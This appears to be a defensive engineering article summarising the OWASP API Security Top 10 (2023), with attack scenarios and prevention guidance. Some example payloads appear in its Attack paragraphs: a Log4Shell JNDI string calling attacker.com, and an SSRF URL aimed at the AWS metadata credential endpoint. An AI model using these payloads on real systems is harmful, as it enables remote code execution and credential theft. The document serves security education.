# [BEE-488] OWASP API Security Top 10

:::info
The OWASP API Security Top 10 is a prioritized list of the most critical security risks specific to APIs — distinct from the general OWASP Top 10 — published to help teams identify and remediate the vulnerabilities that disproportionately affect REST, GraphQL, gRPC, and other structured API surfaces.
:::

## Context

APIs differ from traditional web applications in ways that change the threat model. They expose application logic and sensitive data through structured, machine-readable endpoints. They are consumed by automated clients — mobile apps, B2B integrations, third-party services — which makes high-volume automated abuse trivially easy. They surface more endpoints with more predictable resource identifiers (integer IDs in URLs, consistent path patterns). And their authorization failures are harder to detect because each endpoint looks correct in isolation while granting access it should not.

Erez Yalon, Inon Shkedy, and Paulo Silva — then at Checkmarx — launched the OWASP API Security project. The first stable release was published on December 26, 2019, based on data from bug bounty platforms, security researchers, and industry surveys. The 2023 edition, released June 5, 2023, updated the list to reflect four years of evolving attack patterns: three new categories were added (SSRF, Unrestricted Access to Sensitive Business Flows, Unsafe Consumption of APIs); two 2019 entries were merged (Excessive Data Exposure and Mass Assignment became a single category); Injection was removed from its dedicated slot; and Insufficient Logging & Monitoring was dropped entirely.

Three of the top five 2023 entries are authorization failures — BOLA, Broken Authentication, and Broken Object Property Level Authorization. This concentration reflects a structural truth about APIs: authentication is typically implemented once, at the gateway or framework layer, while authorization must be re-implemented correctly on every individual endpoint. Authorization fatigue — the cognitive load of writing correct authorization checks across dozens or hundreds of endpoints — produces a disproportionate number of security vulnerabilities.

## The 2023 Top 10

### API1:2023 — Broken Object Level Authorization (BOLA)

The most prevalent API vulnerability, present in both the 2019 and 2023 lists at position one. An API endpoint accepts an object identifier (integer, UUID, slug) from the client and returns or modifies the identified object without verifying that the authenticated user has permission to access it.

BOLA is the API-specific name for what is called IDOR (Insecure Direct Object Reference) in web application security. The terms are interchangeable; BOLA is OWASP's preferred term for API contexts.

**Attack**: A car manufacturer's API accepts a Vehicle Identification Number and returns the vehicle's location. No ownership check is performed — any authenticated user can retrieve any vehicle's location by supplying its VIN. Peloton's API (2021) returned full profile data for any user by ID, including users who had set their profiles to private, with no authentication at all. 3 million accounts were exposed.

**Prevention**: Implement authorization checks *inside* the business logic layer on every function that accesses a database object using a client-supplied identifier — not just at the route or middleware layer. Use unpredictable identifiers (UUIDs v4) rather than sequential integers as a defense-in-depth measure, but not as a substitute for authorization. Write automated tests that attempt cross-user access and fail deployments that pass them.

---

### API2:2023 — Broken Authentication

Authentication mechanisms are exposed to all users by definition, making them high-value attack targets. Engineers frequently build custom authentication schemes, misunderstand session boundary semantics, or apply controls inconsistently across endpoint types.

**Attack**: An API rate-limits login attempts to three per minute per request. The GraphQL endpoint allows operation batching. An attacker sends a single GraphQL request containing hundreds of login mutations — one per credential pair from a breach dump — bypassing the per-request rate limit entirely and conducting a credential stuffing attack at scale.

**Prevention**: Treat password recovery, email verification, and account update endpoints with the same security rigor as login. Require re-authentication for sensitive operations (changing email, phone, payment method). Never use API keys for user authentication — use standardized protocols (OAuth 2.0, OpenID Connect). Apply GraphQL-aware rate limiting that counts individual operations within batched requests, not just HTTP requests.

---

### API3:2023 — Broken Object Property Level Authorization

Merged from two 2019 categories (Excessive Data Exposure, Mass Assignment) under their shared root cause: the API fails to enforce authorization at the individual property level, both for reading and for writing.

**Read side (Excessive Data Exposure)**: The API serializes and returns a full model object, relying on the client to filter sensitive fields. An attacker bypasses the client and reads all returned fields directly — including `password_hash`, `ssn`, `credit_score`, or any field that was present in the database row.

**Write side (Mass Assignment)**: The API binds all client-supplied JSON properties to the server-side model without an allowlist. An attacker modifies properties they should not control: `role`, `price`, `isAdmin`, `balance`. The 2012 Homakov/GitHub incident is the canonical example: Egor Homakov exploited a Rails mass assignment vulnerability to add his SSH key to the Rails organization's GitHub account by injecting `public_key[user_id]` into a form submission, giving himself commit access to the official Rails repository.

**Prevention**: Explicitly enumerate which fields each endpoint exposes in responses — do not use generic model serialization. Maintain an allowlist of client-modifiable properties per endpoint; reject or ignore properties outside that allowlist. Disable framework-level mass assignment features (`attr_protected` is insufficient; use `attr_accessible` whitelists or equivalent).

---

### API4:2023 — Unrestricted Resource Consumption

APIs that lack limits on the resources consumed per request — CPU, memory, network bandwidth, storage, third-party API calls, monetary spend — are vulnerable to denial of service and runaway cost. Renamed from "Lack of Resources & Rate Limiting" to emphasize that rate limiting alone is insufficient; the resource units themselves must be bounded.

**Attack**: A password-reset endpoint triggers an SMS via a pay-per-message service. An attacker calls the endpoint thousands of times per minute at $0.05/message, costing thousands of dollars before rate limiting engages. A GraphQL batching attack submits one request containing hundreds of image-upload mutations, exhausting server memory through simultaneous thumbnail generation — bypassing a per-request rate limit.

**Prevention**: Enforce maximum sizes for strings, arrays, uploaded files, and response payloads. Set explicit limits on GraphQL query depth, breadth, and batch size. Apply container or serverless CPU/memory constraints. Configure spending alerts and hard caps on all third-party service integrations. Set execution timeouts. Validate pagination parameters — a `limit=1000000` query parameter should be rejected, not honored.

---

### API5:2023 — Broken Function Level Authorization

Distinct from BOLA (which is about accessing the wrong *object*), this is about invoking functions or endpoints that a user's role should not permit at all. Administrative endpoints, destructive operations, and high-privilege functions must be protected by role checks that are systematically applied, not ad hoc.

**Attack**: An attacker discovers the API's endpoint pattern and calls `/api/admin/v1/users/all` — guessing the admin path. No function-level authorization check is present on that endpoint; the full user database is returned. In another scenario, an attacker switches an HTTP method from `GET` to `POST` on an invite endpoint, finding that the admin-only invite creation function lacks authorization enforcement.

**Prevention**: Implement a single, centralized authorization module invoked for every business function — not per-controller one-off checks. Default to denying all access; require explicit role grants for each endpoint. Audit all API endpoints systematically, not just during development — enumerate which roles are permitted for every verb × path combination and verify that enforcement matches the specification.

---

### API6:2023 — Unrestricted Access to Sensitive Business Flows

A new 2023 category addressing a class of risk that is not a traditional security flaw. The API correctly authenticates and authorizes the user, but fails to account for the harm caused by automated, high-volume use of a legitimate workflow. The attack target is the business logic itself.

**Attack**: An attacker automates purchases of a limited-stock gaming console across hundreds of IP addresses before human customers can react, acquiring the majority of inventory for resale at inflated prices. An airline seat manipulation attack books 90% of seats on a flight and cancels before departure, forcing discount pricing — then purchases at the lower price. A referral program issues credits automatically per new registration; an attacker automates fake registrations to accumulate credits.

**Prevention**: Identify during design which workflows are sensitive to automation abuse, not just which data is sensitive. Apply device fingerprinting to detect non-browser clients on endpoints that should only be called by legitimate users. Require CAPTCHA or friction mechanisms on conversion-critical paths. Rate-limit by business units — by number of items purchased per account or IP, not just HTTP requests per second. Monitor for behavioral anomalies: timing patterns, IP diversity, conversion rates.

---

### API7:2023 — Server Side Request Forgery (SSRF)

A new dedicated 2023 entry. SSRF occurs when the API fetches a remote resource specified by a user-supplied URL without validating it, causing the server to issue requests to internal network addresses, cloud metadata endpoints, or other unintended destinations.

**Attack**: A webhook integration allows users to configure a URL that the API calls when events occur. An attacker configures `http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-default-ssm` — the AWS Instance Metadata Service endpoint. The API fetches the URL and the attacker receives temporary IAM credentials.

This is precisely how the Capital One breach occurred in 2019. Paige Thompson exploited an SSRF vulnerability in Capital One's WAF, obtained IAM credentials via the AWS EC2 metadata service (running IMDSv1, which responds to unauthenticated GET requests), and used those credentials to exfiltrate 106 million credit card application records from S3.

**Prevention**: Implement a URL allowlist that restricts the destination origin, scheme, port, and media type. Block RFC 1918 addresses (`10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`) and the link-local range (`169.254.0.0/16`). Disable HTTP redirects, or validate the redirect destination against the allowlist before following. Never return raw fetch responses to clients. Enforce IMDSv2 on all EC2 instances — IMDSv2 requires a preliminary PUT request to obtain a session token, and rejects PUT requests containing `X-Forwarded-For`, making SSRF-based credential theft non-functional.

---

### API8:2023 — Security Misconfiguration

Misconfiguration at any layer — network, OS, web server, application framework, cloud provider, container orchestrator — can expose sensitive data or executable functionality. The API may be individually correct while the environment around it is not.

**Attack**: A service uses a logging library with JNDI lookup support enabled. An attacker sends an HTTP request with a header value of `${jndi:ldap://attacker.com/Malicious.class}`. The log library expands the placeholder, triggers a remote LDAP lookup, and executes the attacker's class (the Log4Shell pattern). An API that returns responses without `Cache-Control: no-store` allows private session data to be written to a shared machine's browser cache, readable by subsequent users.

**Prevention**: Apply a repeatable hardening checklist across all stack layers at deployment time. Enforce TLS on all API communications including internal service-to-service traffic. Define an explicit allowlist of permitted HTTP methods per endpoint. Set restrictive CORS policies and validate them. Validate `Content-Type` headers and reject mismatched bodies. Ensure all servers in a request chain parse requests identically to prevent HTTP request smuggling.

---

### API9:2023 — Improper Inventory Management

APIs accumulate versions, environments, and integrations over time. Without a maintained inventory, old API versions run in production with stale security controls; beta or staging environments are exposed to the internet without rate limiting; integrations with third-party services accumulate unchecked data-flow permissions.

**Attack**: A beta API host runs the same endpoint as production but without rate limiting. A security researcher discovers it and brute-forces 6-digit password reset tokens — a task that takes 11 hours without rate limiting and would be impossible on the rate-limited production host. The Facebook/Cambridge Analytica incident followed a similar pattern: a third-party app with user consent exploited over-permissioned graph API access to retrieve data on all of a consenting user's friends, yielding 50 million profiles from 270,000 consents.

**Prevention**: Maintain a complete inventory of all API hosts, versions, and environments — including who can reach them. Generate API documentation automatically from code (OpenAPI/Swagger in CI/CD) to keep the inventory current. Apply identical security controls to all versions of an API, including deprecated versions that have not yet been retired. Perform explicit risk analysis before deprecating a version and define a sunset timeline with announced dates.

---

### API10:2023 — Unsafe Consumption of APIs

A new 2023 entry. Developers apply weaker input validation to data received from third-party APIs than to data received directly from users. An attacker compromises an upstream service and injects malicious data — SQL injection payloads, redirect targets, malicious content — that the target system processes without scrutiny.

**Attack**: An attacker plants a SQL injection payload in a third-party data-enrichment service. The target API fetches enriched business data, passes it unsanitized to a SQL query, and executes the attacker's payload against the database. In a second scenario, an attacker compromises a third-party medical storage service and configures 308 permanent redirects to their own server. The target API blindly follows the redirect and transmits sensitive genomic data to the attacker's endpoint.

**Prevention**: Treat all data received from third-party APIs as untrusted input — validate and sanitize it with the same rigor applied to direct user input. Enforce TLS for all API-to-API communications. Maintain an allowlist of permitted redirect destinations; never blindly follow HTTP redirects. Evaluate third-party API providers' security posture, incident history, and data handling policies before integration.

---

## What Changed from 2019 to 2023

| 2019 | 2023 | Change |
|---|---|---|
| API1: Broken Object Level Authorization | API1: Broken Object Level Authorization | Unchanged (still #1) |
| API2: Broken User Authentication | API2: Broken Authentication | Scope broadened |
| API3: Excessive Data Exposure | API3: Broken Object Property Level Authorization | Merged with API6:2019 |
| API4: Lack of Resources & Rate Limiting | API4: Unrestricted Resource Consumption | Renamed, broader scope |
| API5: Broken Function Level Authorization | API5: Broken Function Level Authorization | Unchanged |
| API6: Mass Assignment | *(merged into API3:2023)* | Merged with API3:2019 |
| API7: Security Misconfiguration | API8: Security Misconfiguration | Moved down one slot |
| API8: Injection | *(removed as dedicated entry)* | Dropped |
| API9: Improper Assets Management | API9: Improper Inventory Management | Renamed |
| API10: Insufficient Logging & Monitoring | *(removed)* | Dropped |
| *(new)* | API6: Unrestricted Access to Sensitive Business Flows | Added |
| *(new)* | API7: Server Side Request Forgery | Added |
| *(new)* | API10: Unsafe Consumption of APIs | Added |

## Visual

```mermaid
flowchart TD
    subgraph "Authorization Failures (3 of Top 5)"
        A1["API1: BOLA\nobject-level auth missing"]:::auth
        A3["API3: Broken Property Auth\nover-exposure + mass assignment"]:::auth
        A5["API5: Broken Function Auth\nadmin endpoints unprotected"]:::auth
    end

    subgraph "Abuse and Resource Control"
        A4["API4: Unrestricted Consumption\nno resource / spend limits"]:::abuse
        A6["API6: Business Flow Abuse\nautomated scalping / fraud"]:::abuse
    end

    subgraph "Authentication"
        A2["API2: Broken Authentication\ncredential stuffing, weak sessions"]:::authn
    end

    subgraph "Infrastructure and Supply Chain"
        A7["API7: SSRF\ninternal network / metadata access"]:::infra
        A8["API8: Security Misconfiguration\nlogging libs, CORS, TLS"]:::infra
        A9["API9: Improper Inventory\nold versions, untracked envs"]:::infra
        A10["API10: Unsafe API Consumption\nthird-party data untrusted"]:::infra
    end

    ATTACKER["Attacker"]:::red
    API["Your API"]:::api

    ATTACKER -->|"enumerate IDs"| A1
    ATTACKER -->|"credential stuffing"| A2
    ATTACKER -->|"read hidden fields, inject role"| A3
    ATTACKER -->|"SMS bombing, batch abuse"| A4
    ATTACKER -->|"call admin endpoint"| A5
    ATTACKER -->|"scalping bot"| A6
    ATTACKER -->|"webhook SSRF"| A7
    ATTACKER -->|"Log4Shell, cache poisoning"| A8
    ATTACKER -->|"find unguarded beta host"| A9
    ATTACKER -->|"poison upstream API"| A10

    A1 --> API
    A2 --> API
    A3 --> API
    A4 --> API
    A5 --> API
    A6 --> API
    A7 --> API
    A8 --> API
    A9 --> API
    A10 --> API

    style ATTACKER fill:#c0392b,color:#fff
    style API fill:#27ae60,color:#fff
    style A1 fill:#e74c3c,color:#fff
    style A2 fill:#e74c3c,color:#fff
    style A3 fill:#e74c3c,color:#fff
    style A4 fill:#e67e22,color:#fff
    style A5 fill:#e74c3c,color:#fff
    style A6 fill:#e67e22,color:#fff
    style A7 fill:#8e44ad,color:#fff
    style A8 fill:#8e44ad,color:#fff
    style A9 fill:#8e44ad,color:#fff
    style A10 fill:#8e44ad,color:#fff
```

## Best Practices

**MUST enforce object-level authorization inside business logic, not only at the route or middleware layer.** Middleware that checks "is this user authenticated?" does not check "does this user own this specific record?" Every database query using a client-supplied ID must be accompanied by an ownership or permission check. Automated cross-user access tests — where user A attempts to access user B's resources — MUST be part of the CI pipeline.

**MUST treat third-party API responses as untrusted input.** Data flowing from upstream services into your API carries the same injection risks as direct user input. Validate structure, sanitize content, and never forward raw upstream responses to your clients without schema validation.

**MUST use unpredictable identifiers (UUID v4) for resources exposed in URLs.** Sequential integer IDs are enumerable. UUIDs do not prevent BOLA, but they eliminate the trivial guessing vector and raise the cost of enumeration attacks.

**MUST enforce resource limits at the framework layer.** Rate limits on HTTP requests are necessary but not sufficient. Set maximum sizes for request bodies, arrays, string fields, pagination limits, GraphQL query depth, and batch sizes. Configure spending caps on all third-party integrations.

**SHOULD implement allowlist-based URL validation for any endpoint that fetches user-supplied URLs.** Block private IP ranges (RFC 1918, link-local) and validate scheme, host, port, and media type against an explicit allowlist. Disallow HTTP redirects or validate redirect destinations against the same allowlist.

**SHOULD maintain a live API inventory** with environment, access controls, authentication requirements, and version for every exposed host. Auto-generate this from code (OpenAPI) in CI/CD. Apply identical security controls to all versions — rate limiting, authentication, and authorization must not regress in older API versions still serving traffic.

**SHOULD apply behavioral rate limiting, not just request-rate limiting, for sensitive business flows.** Scalping, credential stuffing, and referral fraud operate within normal per-request rate limits but at abnormal volume or with abnormal patterns. Measure business units: items purchased per hour, accounts created per IP, password reset attempts per user. Alert and throttle on deviations from expected baselines.

**MAY use an API security testing tool** (OWASP ZAP, Burp Suite, 42Crunch, StackHawk) integrated into CI/CD to scan API endpoints for known vulnerability patterns on every pull request, catching regressions before they reach production.

## Related BEEs

- [BEE-30](30.md) -- OWASP Top 10 for Backend: the general OWASP Top 10 for web applications; this article covers the parallel API-specific list
- [BEE-14](../Authentication and Authorization/14.md) -- RBAC vs ABAC Access Control Models: the authorization models underlying API1 (BOLA) and API5 (Broken Function Level Authorization) prevention
- [BEE-266](../Resilience and Reliability/266.md) -- Rate Limiting and Throttling: the implementation mechanics behind API4 (Unrestricted Resource Consumption) and API6 (Business Flow Abuse) prevention
- [BEE-31](31.md) -- Input Validation and Sanitization: the technical foundation for preventing API3 (mass assignment) and API10 (unsafe third-party data consumption)
- [BEE-482](../Security/482.md) -- Zero-Trust Security Architecture: the architectural approach that, if applied, prevents entire classes of API authorization failures

## References

- [OWASP API Security Top 10 2023 — OWASP](https://owasp.org/API-Security/editions/2023/en/0x11-t10/)
- [OWASP API Security Top 10 2023 Release Notes — OWASP](https://owasp.org/API-Security/editions/2023/en/0x04-release-notes/)
- [OWASP API Security Project — owasp.org](https://owasp.org/www-project-api-security/)
- [Capital One Data Breach — DOJ Case (2019)](https://www.justice.gov/usao-wdwa/united-states-v-paige-thompson)
- [AWS IMDSv2 Documentation — AWS](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html)
- [Venmo API Scraping Incident — TechCrunch (2019)](https://techcrunch.com/2019/06/16/millions-venmo-transactions-scraped/)
- [Peloton API User Data Exposure — TechCrunch (2021)](https://techcrunch.com/2021/05/05/peloton-bug-account-data-leak/)
- [GitHub Mass Assignment Vulnerability (Homakov, 2012)](http://homakov.blogspot.com/2012/03/how-to.html)
